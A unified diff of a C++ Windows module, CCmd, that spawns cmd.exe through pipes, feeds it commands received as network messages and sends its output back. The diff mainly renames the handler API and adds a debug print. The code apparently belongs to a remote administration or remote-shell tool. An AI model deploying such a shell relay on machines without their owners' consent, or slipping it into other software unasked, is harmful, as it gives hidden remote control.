@@ -1,9 +1,10 @@
 #include "Cmd.h"
+#include <iostream>
 
-#include <stdio.h>
+using std::iostream;
 
-CCmd::CCmd():
-CEventHandler(CMD)
+CCmd::CCmd(CManager*pManager):
+CMsgHandler(pManager,CMD)
 {
 	m_hReadPipe = NULL;
 	m_hWritePipe = NULL;
@@ -41,7 +42,7 @@ void __stdcall ReadThread(CCmd*pCmd)
 		else if(dwRead != 0){				//Read data to szMsg Buffer;
 			// szMsgBuf is full
 			if (dwMsgLength + dwRead + 1 > 0x1000){
-				pCmd->Send(CMD_RESULT, szMsg, dwMsgLength + 1);
+				pCmd->SendMsg(CMD_RESULT, szMsg, dwMsgLength + 1);
 				dwMsgLength = 0;
 			}
 
@@ -51,7 +52,7 @@ void __stdcall ReadThread(CCmd*pCmd)
 		}
 		//no data,send the data in szMsgBuffer
 		else if (dwMsgLength){
-			pCmd->Send(CMD_RESULT, szMsg, dwMsgLength + 1);
+			pCmd->SendMsg(CMD_RESULT, szMsg, dwMsgLength + 1);
 			dwMsgLength = 0;
 		}
 		else{
@@ -59,22 +60,21 @@ void __stdcall ReadThread(CCmd*pCmd)
 		}
 	}
 
-	pCmd->Disconnect();
+	pCmd->Close();
 }
 
 void CCmd::OnClose()
 {
 	//关掉cmd.;
-	if (m_pi.hProcess != NULL)
-	{
+	if (m_pi.hProcess != NULL){
 		TerminateProcess(m_pi.hProcess, 0);
 		//
 		CloseHandle(m_pi.hProcess);
 		CloseHandle(m_pi.hThread);
 	}
 	//线程ReadFile会结束，等待线程退出。;
-	if(WAIT_TIMEOUT == WaitForSingleObject(m_hReadThread, 60000))
-	{
+	std::cout << __LINE__ << "线程ReadFile会结束，等待线程退出。;" << std::endl;
+	if(WAIT_TIMEOUT == WaitForSingleObject(m_hReadThread, 60000)){
 		TerminateThread(m_hReadThread,0);
 		WaitForSingleObject(m_hReadThread, INFINITE);
 	}
@@ -84,26 +84,22 @@ void CCmd::OnClose()
 	CloseHandle(m_hReadPipe);
 	CloseHandle(m_hWritePipe);
 }
-void CCmd::OnConnect()
+void CCmd::OnOpen()
 {
 	DWORD dwStatu = 0;
 	dwStatu = CmdBegin();
 
 	//成功.;
-	Send(CMD_BEGIN, (char*)&dwStatu, sizeof(DWORD));
+	SendMsg(CMD_BEGIN, (char*)&dwStatu, sizeof(DWORD));
 
 	if (dwStatu == -1){
-		Disconnect();
+		Close();
 	}
 }
-void CCmd::OnReadPartial(WORD Event, DWORD Total, DWORD Read, char*Buffer)
-{
 
-}
-void CCmd::OnReadComplete(WORD Event, DWORD Total, DWORD Read, char*Buffer)
+void CCmd::OnReadMsg(WORD Msg ,DWORD dwSize, char*Buffer)
 {
-	switch (Event)
-	{
+	switch (Msg){
 	case CMD_COMMAND:
 		OnCommand(Buffer);
 		break;
@@ -116,11 +112,10 @@ void CCmd::OnCommand(char*szCmd)
 {
 	DWORD dwWrite = 0;
 	DWORD dwLeft = lstrlenA(szCmd);
-	while(dwLeft>0)
-	{
+	while(dwLeft>0){
 		dwWrite = 0;
 		if (FALSE == WriteFile(m_hWritePipe, szCmd,dwLeft, &dwWrite, NULL)){	
-			Disconnect();
+			Close();
 			break;
 		}
 		szCmd+=dwWrite;
@@ -155,11 +150,8 @@ int CCmd::CmdBegin()
 	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
 	
 	//
-	WCHAR szCmdPath[1024] = {0};
-	GetSystemDirectoryW(szCmdPath,1024);
-	lstrcatW(szCmdPath,L"\\cmd.exe");
-	if (FALSE == CreateProcess(szCmdPath, NULL, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL,NULL ,&si, &m_pi))
-	{
+	TCHAR szCmd[] = TEXT("cmd.exe");
+	if (FALSE == CreateProcess(NULL, szCmd, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &m_pi)){
 		return -1;
 	}
 
